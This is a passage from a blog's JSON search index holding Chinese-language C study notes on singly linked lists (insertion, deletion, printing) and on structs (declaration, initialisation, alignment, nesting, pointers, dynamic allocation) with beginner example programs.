0;\n&#125;\n\n单链表的优势\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Node\n&#123;\n    int value;\n    struct Node *next;\n&#125;;\n\nvoid insertNode(struct Node **head, int value)\n&#123;\n    struct Node *previous;\n    struct Node *current;\n    struct Node *new;\n\n    current &#x3D; *head;\n    previous &#x3D; NULL;\n\n    while(current !&#x3D; NULL &amp;&amp; current-&gt;value &lt; value)\n    &#123;\n        previous &#x3D; current;\n        current &#x3D; current-&gt;next;\n    &#125;\n\n    new &#x3D; (struct Node *)malloc(sizeof(struct Node));\n    if(new &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败！\\n&quot;);\n        exit(1);\n    &#125;\n    new-&gt;value &#x3D; value;\n    new-&gt;next &#x3D; current;\n\n    if(previous &#x3D;&#x3D; NULL)\n    &#123;\n        *head &#x3D; new;\n    &#125;\n    else\n    &#123;\n        previous-&gt;next &#x3D; new;\n    &#125;\n&#125;\n\nvoid printNode(struct Node *head)\n&#123;\n    struct Node *current;\n\n    current &#x3D; head;\n    while(current !&#x3D; NULL)\n    &#123;\n        printf(&quot;%d\\n&quot;, current-&gt;value);\n        current &#x3D; current-&gt;next;\n    &#125;\n\n    putchar(&#39;\\n&#39;);\n&#125;\n\nint main(void)&#123;\n    struct Node *head &#x3D; NULL;\n    int input;\n\n    while(1)\n    &#123;\n        printf(&quot;请输入一个整数（输入-1表示结束：)：&quot;);\n        scanf(&quot;%d&quot;,&amp;input);\n        if(input &#x3D;&#x3D; -1)\n        &#123;\n            break;\n        &#125;\n        insertNode(&amp;head, input);\n        printNode(head);\n    &#125;\n\n    return 0;\n&#125;  \n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Node\n&#123;\n    int value;\n    struct Node *next;\n&#125;;\n\nvoid insertNode(struct Node **head, int value)\n&#123;\n    struct Node *previous;\n    struct Node *current;\n    struct Node *new;\n\n    current &#x3D; *head;\n    previous &#x3D; NULL;\n\n    while(current !&#x3D; NULL &amp;&amp; current-&gt;value &lt; value)\n    &#123;\n        previous &#x3D; current;\n        current &#x3D; current-&gt;next;\n    &#125;\n\n    new &#x3D; (struct Node *)malloc(sizeof(struct Node));\n    if(new &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败！\\n&quot;);\n        exit(1);\n    &#125;\n    new-&gt;value &#x3D; value;\n    new-&gt;next &#x3D; current;\n\n    if(previous &#x3D;&#x3D; NULL)\n    &#123;\n        *head &#x3D; new;\n    &#125;\n    else\n    &#123;\n        previous-&gt;next &#x3D; new;\n    &#125;\n&#125;\n\nvoid printNode(struct Node *head)\n&#123;\n    struct Node *current;\n\n    current &#x3D; head;\n    while(current !&#x3D; NULL)\n    &#123;\n        printf(&quot;%d\\n&quot;, current-&gt;value);\n        current &#x3D; current-&gt;next;\n    &#125;\n\n    putchar(&#39;\\n&#39;);\n&#125;\n\nvoid deleteNode(struct Node **head, int value)\n&#123;\n    struct Node *previous;\n    struct Node *current;\n\n    current &#x3D; *head;\n    previous &#x3D; NULL;\n    while(current !&#x3D; NULL &amp;&amp; current-&gt;value !&#x3D; value)\n    &#123;\n        previous &#x3D; current;\n        current &#x3D; current-&gt;next;\n    &#125;\n    if(current &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;找不到匹配的节点!\\n&quot;);\n        return;\n    &#125;\n    else\n    &#123;\n        if(previous &#x3D;&#x3D; NULL)\n        &#123;\n            *head &#x3D; current-&gt;next;\n        &#125;\n        else\n        &#123;\n            previous-&gt;next &#x3D; current-&gt;next;\n        &#125;\n        free(current);\n    &#125;\n&#125;\n\nint main(void)&#123;\n    struct Node *head &#x3D; NULL;\n    int input;\n\n    printf(&quot;开始测试插入整数...\\n&quot;);\n    while(1)\n    &#123;\n        printf(&quot;请输入一个整数（输入-1表示结束：)：&quot;);\n        scanf(&quot;%d&quot;,&amp;input);\n        if(input &#x3D;&#x3D; -1)\n        &#123;\n            break;\n        &#125;\n        insertNode(&amp;head, input);\n        printNode(head);\n    &#125;\n\n    printf(&quot;开始测试删除整数...\\n&quot;);\n     while(1)\n    &#123;\n        printf(&quot;请输入一个整数（输入-1表示结束：)：&quot;);\n        scanf(&quot;%d&quot;,&amp;input);\n        if(input &#x3D;&#x3D; -1)\n        &#123;\n            break;\n        &#125;\n        deleteNode(&amp;head, input);\n        printNode(head);\n    &#125;\n\n    return 0;\n&#125;","slug":"c语言_02","date":"2023-04-24T01:50:13.000Z","categories_index":"文章","tags_index":"c语言基础","author_index":"南瓜の无名"},{"id":"a92f95749a1c85a9800c2a62de3c6bb6","title":"c语言学习笔记_01结构体","content":"结构体结构体声明struct 结构体名称\n&#123;\n    结构体成员1;\n    结构体成员2;\n    结构体成员3;\n&#125;;\n\n例：\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    unsigned int date;\n    char publisher[40];\n&#125;;\n\n定义结构体类型变量struct 结构体名称 结构体变量名\n\n#include &lt;stdio.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    unsigned int date;\n    char publisher[40];\n&#125; book;\n\nint main(void)\n&#123;\n    &#x2F;&#x2F; struct Book book;\n\n    return 0;\n&#125;\n\n\n访问结构体变量#include &lt;stdio.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    unsigned int date;\n    char publisher[40];\n&#125; book;\n\nint main(void)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book.title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book.author);\n    printf(&quot;请输入售价：&quot;);\n    scanf(&quot;%f&quot;, &amp;book.price);\n    printf(&quot;请输入出版日期：&quot;);\n    scanf(&quot;%d&quot;, &amp;book.date);\n    printf(&quot;请输入出版社：&quot;);\n    scanf(&quot;%s&quot;, book.publisher);\n\n    printf(&quot;\\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;数据录入完毕&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\\n&quot;);\n\n    printf(&quot;书名：%s\\n&quot;, book.title);\n    printf(&quot;作者：%s\\n&quot;, book.author);\n    printf(&quot;售价：%.2f\\n&quot;, book.price);\n    printf(&quot;出版日期：%d\\n&quot;, book.date);\n    printf(&quot;出版社：%s\\n&quot;, book.publisher);\n\n    return 0;\n&#125;\n\n初始化结构体变量struct Book book &#x3D; &#123;\n    &quot;书名&quot;,           &#x2F;&#x2F; char title[128];\n    &quot;作者&quot;,           &#x2F;&#x2F; char author[40];\n    48.8,            &#x2F;&#x2F; float price;\n    20221212,        &#x2F;&#x2F; unsigned int date;\n    &quot;出版社&quot;         &#x2F;&#x2F; char publisher[40];\n&#125;;\n\n初始化结构体的指定成员值struct Book book &#x3D; &#123;\n    .price &#x3D; 48.8,\n    .publisher &#x3D; &quot;出版社&quot;,\n    .date &#x3D; 20221212\n&#125;;\n\n例题#include &lt;stdio.h&gt;\n\nint main(void)&#123;\n    struct A\n    &#123;\n        char a;\n        int b;\n        char c;\n    &#125; a &#x3D; &#123;&#39;x&#39;, 520, &#39;o&#39;&#125;;\n\n    printf(&quot;size of a &#x3D; %d \\n&quot;, sizeof(a));\n\n    return 0;\n&#125;\n\n&#x2F;&#x2F; 输出结果为: size of a &#x3D; 12\n&#x2F;&#x2F; 内存对齐 1 4 1 -&gt; 4 4 4\n\n#include &lt;stdio.h&gt;\n\nint main(void)&#123;\n    struct A\n    &#123;\n        char a;\n        char c;\n        int b; \n    &#125; a &#x3D; &#123;&#39;x&#39;, &#39;o&#39;, 520&#125;;\n\n    printf(&quot;size of a &#x3D; %d \\n&quot;, sizeof(a));\n\n    return 0;\n&#125;\n\n&#x2F;&#x2F; 输出结果为: size of a &#x3D; 12\n&#x2F;&#x2F; 内存对齐 1 1 4 -&gt; 4 4 \n\n结构体嵌套#include &lt;stdio.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char publisher[40];\n&#125; book &#x3D; &#123;\n    &quot;书名&quot;，\n    &quot;作者&quot;,\n    48.8,\n    &#123;2022，12，12&#125;,\n    &quot;出版社&quot;\n&#125;;\n\nint main(void)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book.title);\n    printf(&quot;作者：%s\\n&quot;, book.author);\n    printf(&quot;售价：%.2f\\n&quot;, book.price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, book.date.year, book.date.month, book.date.day);\n    printf(&quot;出版社：%s\\n&quot;, book.publisher);\n\n    return 0;\n&#125;\n\n结构体数组· 第一种方法是在声明结构体的时候进行定义：\n&#x2F;&#x2F; struct 结构体名称\n&#x2F;&#x2F; &#123;\n&#x2F;&#x2F;     结构体成员;\n&#x2F;&#x2F; &#125; 数组名[长度];\n\n· 第二种方法是先声明一个结构体类型（比如上面的Book），再用此类型定义一个结构体数组：\n&#x2F;&#x2F; struct 结构体名称\n&#x2F;&#x2F; &#123;\n&#x2F;&#x2F;     结构体成员;\n&#x2F;&#x2F; &#125;;\n&#x2F;&#x2F; struct 结构体名称 数组名[长度];\n\n结构体指针struct Book * pt;\npt &#x3D; &amp;book;\n\n通过结构体指针访问结构体成员有两种方法：\n(*结构体指针).成员名\n结构体指针-&gt;成员名\n\n#include &lt;stdio.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char publisher[40];\n&#125; book &#x3D; &#123;\n    &quot;书名&quot;，\n    &quot;作者&quot;,\n    48.8,\n    &#123;2022，12，12&#125;,\n    &quot;出版社&quot;\n&#125;;\n\nint main(void)\n&#123;\n    struct Book *pt;\n    pt &#x3D; &amp;book;\n\n    printf(&quot;书名：%s\\n&quot;, (*pt).title);\n    printf(&quot;作者：%s\\n&quot;, (*pt).author);\n    printf(&quot;售价：%.2f\\n&quot;, (*pt).price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, (*pt).date.year, (*pt).date.month, (*pt).date.day);\n    printf(&quot;出版社：%s\\n&quot;, (*pt).publisher);\n\n    return 0;\n&#125;\n\n传递结构体变量#include &lt;stdio.h&gt;\n\nint main(void)\n&#123;\n    struct Test\n    &#123;\n        int x;\n        int y;\n    &#125;t1, t2;\n\n    t1.x &#x3D; 3;\n    t1.y &#x3D; 4;\n\n    t2 &#x3D; t1;\n\n    printf(&quot;t2.x &#x3D; %d, t2.y &#x3D; %d \\n&quot;, t2.x, t2.y);\n\n    return 0;\n&#125;\n\n#include &lt;stdio.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char publisher[40];\n&#125;;\n\nstruct Book getInput(struct Book book);\n\nstruct Book getInput(struct Book book)\n&#123;\n     printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book.title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book.author);\n    printf(&quot;请输入售价：&quot;);\n    scanf(&quot;%f&quot;, &amp;book.price);\n    printf(&quot;请输入出版日期：&quot;);\n    scanf(&quot;%d-%d-%d&quot;, &amp;book.date.year, &amp;book.date.month, &amp;book.date.day);\n    printf(&quot;请输入出版社：&quot;);\n    scanf(&quot;%s&quot;, book.publisher);\n\n    return book;\n&#125;\n\nvoid printBook(struct Book book);\n\nvoid printBook(struct Book book)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book.title);\n    printf(&quot;作者：%s\\n&quot;, book.author);\n    printf(&quot;售价：%.2f\\n&quot;, book.price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, book.date.year, book.date.month, book.date.day);\n    printf(&quot;出版社：%s\\n&quot;, book.publisher);\n&#125;\n\nint main(void)\n&#123;\n    struct Book b1,b2;\n\n    printf(&quot;请录入第一本书的信息...\\n&quot;);\n\n    b1 &#x3D; getInput(b1);\n\n    putchar(&#39;\\n&#39;);\n\n    printf(&quot;请输入第二本书的信息...\\n&quot;);\n\n    b2 &#x3D; getInput(b2);\n\n    printf(&quot;\\n\\n录入完毕，现在开始打印验证\\n\\n&quot;);\n\n    printf(&quot;打印第一本书的信息：&quot;);\n\n    printBook(b1);\n\n    printf(&quot;打印第二本书的信息：&quot;);\n\n    putchar(&#39;\\n&#39;);\n\n    printBook(b2);\n\n    return 0;\n&#125;\n\n\n传递指向结构体变量的指针· 一切为了效率\n\n#include &lt;stdio.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char publisher[40];\n&#125;;\n\nvoid getInput(struct Book *book);\n\nvoid getInput(struct Book *book)\n&#123;\n     printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n    printf(&quot;请输入售价：&quot;);\n    scanf(&quot;%f&quot;, &amp;book-&gt;price);\n    printf(&quot;请输入出版日期：&quot;);\n    scanf(&quot;%d-%d-%d&quot;, &amp;book-&gt;date.year, &amp;book-&gt;date.month, &amp;book-&gt;date.day);\n    printf(&quot;请输入出版社：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;publisher);\n&#125;\n\nvoid printBook(struct Book *book);\n\nvoid printBook(struct Book *book)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n    printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n    printf(&quot;售价：%.2f\\n&quot;, book-&gt;price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, book-&gt;date.year, book-&gt;date.month, book-&gt;date.day);\n    printf(&quot;出版社：%s\\n&quot;, book-&gt;publisher);\n&#125;\n\nint main(void)\n&#123;\n    struct Book b1,b2;\n\n    printf(&quot;请录入第一本书的信息...\\n&quot;);\n\n    getInput(&amp;b1);\n\n    putchar(&#39;\\n&#39;);\n\n    printf(&quot;请输入第二本书的信息...\\n&quot;);\n\n    getInput(&amp;b2);\n\n    printf(&quot;\\n\\n录入完毕，现在开始打印验证\\n\\n&quot;);\n\n    printf(&quot;打印第一本书的信息：&quot;);\n\n    printBook(&amp;b1);\n\n    printf(&quot;打印第二本书的信息：&quot;);\n\n    putchar(&#39;\\n&#39;);\n\n    printBook(&amp;b2);\n\n    return 0;\n&#125;\n\n动态申请结构体使用malloc函数为结构体分配存储空间\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char publisher[40];\n&#125;;\n\nvoid getInput(struct Book *book);\n\nvoid getInput(struct Book *book)\n&#123;\n     printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n    printf(&quot;请输入售价：&quot;);\n    scanf(&quot;%f&quot;, &amp;book-&gt;price);\n    printf(&quot;请输入出版日期：&quot;);\n    scanf(&quot;%d-%d-%d&quot;, &amp;book-&gt;date.year, &amp;book-&gt;date.month, &amp;book-&gt;date.day);\n    printf(&quot;请输入出版社：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;publisher);\n&#125;\n\nvoid printBook(struct Book *book);\n\nvoid printBook(struct Book *book)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n    printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n    printf(&quot;售价：%.2f\\n&quot;, book-&gt;price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, book-&gt;date.year, book-&gt;date.month, book-&gt;date.day);\n    printf(&quot;出版社：%s\\n&quot;, book-&gt;publisher);\n&#125;\n\nint main(void)\n&#123;\n    struct Book *b1,*b2;\n\n    b1 &#x3D; (struct Book *)malloc(sizeof(struct Book));\n    b2 &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (b1 &#x3D;&#x3D; NULL || b2 &#x3D;&#x3D; NULL)&#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    printf(&quot;请录入第一本书的信息...\\n&quot;);\n\n    getInput(b1);\n\n    putchar(&#39;\\n&#39;);\n\n    printf(&quot;请输入第二本书的信息...\\n&quot;);\n\n    getInput(b2);\n\n    printf(&quot;\\n\\n录入完毕，现在开始打印验证\\n\\n&quot;);\n\n    printf(&quot;打印第一本书的信息：\\n&quot;);\n\n    printBook(b1);\n\n    printf(&quot;打印第二本书的信息：\\n&quot;);\n\n    putchar(&#39;\\n&#39;);\n\n    printBook(b2);\n\n    free(b1);\n    free(b2);\n\n    return 0;\n&#125;","slug":"c语言_01","date":"2023-04-23T03:20:34.000Z","categories_index":"文章","tags_index":"c语言基础","author_index":"南瓜の无名"}]